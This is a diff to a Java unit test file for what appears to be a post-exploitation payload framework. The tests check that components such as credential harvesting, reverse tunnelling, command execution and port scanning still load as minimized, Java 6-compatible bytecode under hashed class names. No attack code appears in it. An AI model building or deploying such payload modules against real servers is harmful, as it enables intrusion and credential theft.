@@ -7,6 +7,8 @@ import org.leo.core.util.request.ClassNameGenerator;
 import org.objectweb.asm.ClassReader;
 
 import java.nio.charset.StandardCharsets;
+import java.io.File;
+import java.util.Arrays;
 import java.util.concurrent.ThreadFactory;
 
 import static org.junit.jupiter.api.Assertions.assertArrayEquals;
@@ -16,6 +18,44 @@ import static org.junit.jupiter.api.Assertions.assertNotEquals;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 class ComponentBytecodeProfileTest {
+
+    private static final String[] ALL_COMPONENTS = {
+            "BasicInfoComponent", "ClipboardComponent", "CompressComponent",
+            "CredentialHarvestComponent", "DatabaseComponent", "DecompressComponent",
+            "ExecCommandComponent", "ExecCommandSimpleComponent", "ExecScriptComponent",
+            "FileComponent", "FileDownloadComponent", "FileEnhanceComponent",
+            "FileUploadComponent", "FingerprintComponent", "HostIsReachableComponent",
+            "HttpRequestComponent", "PluginComponent", "PortScanComponent",
+            "ProxyForwardComponent", "ReconScanComponent", "ResourceComponent",
+            "ReverseTunnelComponent", "ScreenComponent", "SpringFrameworkManageComponent",
+            "TomcatCatalinaManageComponent", "WeblogicCatalinaManageComponent"
+    };
+
+    @Test
+    void everyMinimizedComponentRemainsLoadableAndJava6Compatible() throws Exception {
+        BytecodeLoader loader = new BytecodeLoader();
+        for (String component : ALL_COMPONENTS) {
+            String className = "org.leo.runtime.C" + Integer.toHexString(component.hashCode());
+            byte[] source = CloneWithJavassist.cloneClass(component, className, 7L);
+            byte[] minimized = minimize(source);
+            assertEquals(50, majorVersion(minimized), component);
+            assertTrue(minimized.length <= source.length, component);
+            assertTrue(Runnable.class.isAssignableFrom(loader.define(className, minimized)), component);
+        }
+    }
+
+    @Test
+    void componentRegistryMatchesPayloadDirectory() {
+        File directory = new File("src/main/resources/component");
+        String[] payloads = directory.list((dir, name) -> name.endsWith(".payload"));
+        assertTrue(payloads != null);
+        String[] names = Arrays.stream(payloads)
+                .map(name -> name.substring(0, name.length() - ".payload".length()))
+                .sorted().toArray(String[]::new);
+        String[] expected = ALL_COMPONENTS.clone();
+        Arrays.sort(expected);
+        assertArrayEquals(expected, names);
+    }
 
     @Test
     void transformedWorkerPoolsUseTheRuntimeClassProfile() throws Exception {
@@ -33,8 +73,9 @@ class ComponentBytecodeProfileTest {
             Object instance = loader.define(className, bytecode).getDeclaredConstructor().newInstance();
             Thread worker = ((ThreadFactory) instance).newThread(() -> { });
 
-            assertTrue(worker.getName().startsWith(instance.getClass().getSimpleName() + "-"));
+            assertTrue(worker.getName().startsWith("worker-"));
             assertFalse(worker.getName().startsWith("pool-"));
+            assertTrue(worker.isDaemon());
         }
     }
 
